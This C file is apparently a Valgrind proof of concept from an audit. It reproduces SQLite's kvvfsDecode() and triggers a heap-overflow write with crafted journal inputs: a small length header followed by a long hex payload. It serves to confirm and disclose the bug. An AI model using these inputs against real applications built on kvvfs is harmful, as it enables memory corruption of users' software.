/*
** Valgrind cross-verification PoC for the kvvfsDecode() heap-overflow WRITE
** in SQLite src/os_kv.c (kvvfs / WASM key-value VFS).
**
** The kvvfsHexValue[] table and the kvvfsDecode() function below are copied
** VERBATIM from src/os_kv.c at the audited commit b1a73ba34d, which the
** live-at-HEAD check confirmed is byte-identical on current trunk
** (raw.githubusercontent.com/sqlite/sqlite/master/src/os_kv.c).
**
** The bug: kvvfsDecode()'s hex-pair branch writes aOut[j] / aOut[j++] with NO
** check that j < nOut.  Only the zero-run (memset) branch checks j+n>nOut.
** kvvfsDecodeJournal() sizes aOut via malloc(n) where n is a length header
** taken from the SAME untrusted journal text, then decodes the hex payload
** into it -- so a small header + long hex payload overflows the heap buffer.
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ---------- VERBATIM from src/os_kv.c ---------- */
static const signed char kvvfsHexValue[256] = {
  -1, -1, -1, -1, -1, -1, -1, -1,   -1, -1, -1, -1, -1, -1, -1, -1,
  -1, -1, -1, -1, -1, -1, -1, -1,   -1, -1, -1, -1, -1, -1, -1, -1,
  -1, -1, -1, -1, -1, -1, -1, -1,   -1, -1, -1, -1, -1, -1, -1, -1,
   0,  1,  2,  3,  4,  5,  6,  7,    8,  9, -1, -1, -1, -1, -1, -1,
  -1, 10, 11, 12, 13, 14, 15, -1,   -1, -1, -1, -1, -1, -1, -1, -1,
  -1, -1, -1, -1, -1, -1, -1, -1,   -1, -1, -1, -1, -1, -1, -1, -1,
  -1, -1, -1, -1, -1, -1, -1, -1,   -1, -1, -1, -1, -1, -1, -1, -1,
  -1, -1, -1, -1, -1, -1, -1, -1,   -1, -1, -1, -1, -1, -1, -1, -1,

  -1, -1, -1, -1, -1, -1, -1, -1,   -1, -1, -1, -1, -1, -1, -1, -1,
  -1, -1, -1, -1, -1, -1, -1, -1,   -1, -1, -1, -1, -1, -1, -1, -1,
  -1, -1, -1, -1, -1, -1, -1, -1,   -1, -1, -1, -1, -1, -1, -1, -1,
  -1, -1, -1, -1, -1, -1, -1, -1,   -1, -1, -1, -1, -1, -1, -1, -1,
  -1, -1, -1, -1, -1, -1, -1, -1,   -1, -1, -1, -1, -1, -1, -1, -1,
  -1, -1, -1, -1, -1, -1, -1, -1,   -1, -1, -1, -1, -1, -1, -1, -1,
  -1, -1, -1, -1, -1, -1, -1, -1,   -1, -1, -1, -1, -1, -1, -1, -1,
  -1, -1, -1, -1, -1, -1, -1, -1,   -1, -1, -1, -1, -1, -1, -1, -1
};

int kvvfsDecode(const char *a, char *aOut, int nOut){
  int i, j;
  int c;
  const unsigned char *aIn = (const unsigned char*)a;
  i = 0;
  j = 0;
  while( 1 ){
    c = kvvfsHexValue[aIn[i]];
    if( c<0 ){
      int n = 0;
      int mult = 1;
      c = aIn[i];
      if( c==0 ) break;
      while( c>='a' && c<='z' ){
        n += (c - 'a')*mult;
        mult *= 26;
        c = aIn[++i];
      }
      if( j+n>nOut ) return -1;
      memset(&aOut[j], 0, n);
      j += n;
      if( c==0 || mult==1 ) break; /* progress stalled if mult==1 */
    }else{
      aOut[j] = c<<4;
      c = kvvfsHexValue[aIn[++i]];
      if( c<0 ) return -1 /* hex bytes are always in pairs */;
      aOut[j++] += c;
      i++;
    }
  }
  return j;
}
/* ---------- end verbatim ---------- */

int main(void){
  /* === Test A: direct, exactly how kvvfsDecodeJournal calls it:
        kvvfsDecode(zTxt+i, pFile->aJrnl, pFile->nJrnl)  === */
  {
    int nOut = 4;                              /* attacker-declared journal size */
    char *aOut = (char*)malloc(nOut);          /* 4-byte heap allocation */
    const char *payload = "00112233445566778899AABBCCDDEEFF"; /* 16 hex pairs = 16 bytes */
    int rc = kvvfsDecode(payload, aOut, nOut);
    printf("[A] nOut=%d  kvvfsDecode returned %d (= bytes written)  -> %d bytes into a %d-byte buffer\n",
           nOut, rc, rc, nOut);
    free(aOut);
  }

  /* === Test B: end-to-end, replicating kvvfsDecodeJournal verbatim.
        Header "a{" parses to n=26; followed by 100 hex pairs (100 bytes). === */
  {
    char zTxt[512];
    strcpy(zTxt, "a{");                        /* length header -> n=26 */
    for(int k=0;k<100;k++) strcat(zTxt, "FF"); /* 100-byte hex payload */

    /* --- verbatim header parse from kvvfsDecodeJournal() --- */
    unsigned int n = 0;
    int c, i, mult;
    i = 0;
    mult = 1;
    while( (c = zTxt[i++])>='a' && c<='z' ){
      n += (zTxt[i] - 'a')*mult;
      mult *= 26;
    }
    char *aJrnl = (char*)malloc( n );          /* same as pFile->aJrnl = sqlite3_malloc64(n) */
    printf("[B] header parsed n=%u, malloc(%u); payload=100 bytes\n", n, n);
    int rc = kvvfsDecode(zTxt+i, aJrnl, (int)n);
    printf("[B] kvvfsDecode returned %d (= bytes written into the %u-byte buffer)\n", rc, n);
    free(aJrnl);
  }
  return 0;
}
